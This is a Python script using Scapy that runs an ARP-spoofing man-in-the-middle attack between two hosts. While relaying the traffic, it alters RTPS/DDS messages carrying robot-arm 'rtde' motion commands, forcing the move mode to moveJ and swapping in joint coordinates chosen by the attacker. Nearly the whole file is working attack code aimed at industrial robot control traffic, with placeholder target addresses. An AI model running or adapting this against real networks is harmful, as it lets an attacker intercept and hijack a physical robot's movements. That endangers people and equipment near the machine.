import time
import threading

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
load_contrib("rtps")
#from scapy.contrib.rtps.rtps import RTPS
#list_contrib()

interface = "XXX"
target1_ip = "xx.xx.xx.xx"
target2_ip = "xx.xx.xx.xx"

global count
count = 0.5

global path
path = True

print(f"listening on iface: {interface}\n")

attacker_mac = get_if_hwaddr(interface)
attacker_ip = get_if_addr(interface)

print(f"attacker\n  ip: {attacker_ip}\n  mac: {attacker_mac}\n")

target1_mac = getmacbyip(target1_ip)
print(f"target1\n  ip: {target1_ip}\n  mac: {target1_mac}\n")
target2_mac = getmacbyip(target2_ip)
print(f"target2\n  ip: {target2_ip}\n  mac: {target2_mac}\n")


# send spoof packet for getting traffic for ip_mimic from ip_target
def spoof(ip_target, ip_mimic):
  ip_target_mac = getmacbyip(ip_target)
  packet = ARP(op=2, pdst=ip_target, hwdst=ip_target_mac, psrc=ip_mimic)
  send(packet, iface=interface, verbose=False)

# spoof target 1 and 2 in an infinite loop
def spoofing():
  while True:
    spoof(target1_ip, target2_ip)
    spoof(target2_ip, target1_ip)
    time.sleep(2)

# undo's the work of spoof()
def restore(ip_target, ip_mimic):
  ip_target_mac = getmacbyip(ip_target)
  ip_mimic_mac = getmacbyip(ip_mimic)
  packet = ARP(op=2, pdst=ip_target, hwdst=ip_target_mac, hwsrc=ip_mimic_mac, psrc=ip_mimic)
  send(packet, iface=interface, verbose=False)

def mitm():
  # sniff one iface and forward spoofed packages
  sniff(iface=interface, prn=forward)

def forward(packet):
  if Raw in packet:
    if packet[Raw].load[0:4] == b'RTPS':
      packet[Raw] = RTPS(packet[Raw].load)

  # manip RTPS packet
  if RTPS in packet:
    if DataPacket in packet:
      manip_datapacket(packet)

  if TCP in packet:
    packet[TCP].len = None
    packet[TCP].chksum = None
  if UDP in packet:
    packet[UDP].len = None
    packet[UDP].chksum = None

  # if the packet uses an IP-layer
  if IP in packet:
    doSend = False
    # when it was supposed to be send from target 2-to-1 or 1-to-2; give the correct mac addres for it's destination
    if packet[IP].src == target2_ip and packet[IP].dst == target1_ip and packet[Ether].dst == attacker_mac:
      packet[Ether].dst = target1_mac
      packet[Ether].src = attacker_mac
      doSend = True
    elif packet[IP].src == target1_ip and packet[IP].dst == target2_ip and packet[Ether].dst == attacker_mac:
      packet[Ether].dst = target2_mac
      packet[Ether].src = attacker_mac
      doSend = True

    # forward(/send) packet if criteria is met
    if doSend == True:
      #print('forwarding packet...')
      sendp(packet, iface=interface, verbose=False) # send packet on iface

def manip_datapacket(packet):
  #print(packet[DataPacket].serializedData)
  #ls(packet)

  # i think it sends 2 messages, one with the count, one with the image
  for submessage in packet.submessages:

    # the image is in the data attribute, which the other one doesnt have
    if hasattr(submessage, 'data'):
      for parameterValue in submessage.data.parameterList.parameterValues:
        if hasattr(parameterValue, 'parameterData'):

          if b'rtde' in parameterValue.parameterData:
            global count
            count += 0.5
            global path

            print(f'\nIntercepted (decoded): {parameterValue.parameterData.decode(errors="replace")}')

            data_decoded = parameterValue.parameterData.decode(errors="replace")

            move_mode = data_decoded[data_decoded.find('rtde_c.')+7:data_decoded.find('(')]
            coords_array = "[" + data_decoded[data_decoded.find('[')+1:data_decoded.find(']')] + "]"

            print(f'Move mode: {move_mode}')
            print(f'Coordinates array: {coords_array}')

            # replacing the received move mode by moveJ
            parameterValue.parameterData = parameterValue.parameterData.replace(bytes(move_mode, 'utf-8'), b'moveJ')

            # if you want the robot to follow a 2 points path
            if path:
              if count%2 == 0:
                # first position
                position1 = "[1.583, -2.04, -1.95, -1.06, 1.55, 2.93]"
                pos = position1
              else:
                # second position
                position2 = "[1.583, -1.62, -0.97, -1.06, 1.55, 2.93]"
                pos = position2
            # else you just give it one array of coordinates
            else:
              pos = "[-0.57, -1.94, -0.60, -0.32, 1.68, 1.89]"

            # replacing the received coordinates by the new ones
            parameterValue.parameterData = parameterValue.parameterData.replace(bytes(coords_array, 'utf-8'), bytes(pos, 'utf-8'))

            print(f'New value:   {parameterValue.parameterData.decode(errors="replace")}')

  # this works for a single string i presume  
  #packet[RTPSSumMessage_DATA].octetsToNextHeader = None




# only run when the script is executed not imported
if __name__ == '__main__':
  # thread for inifite spoof loop
  t1 = threading.Thread(target=spoofing, daemon=True) #daemon to turn off when main thread is closed
  t1.start() #start thread

  mitm()

  #time.sleep(15)

  # restore spoofing
  restore(target1_ip, target2_ip)
  restore(target2_ip, target1_ip)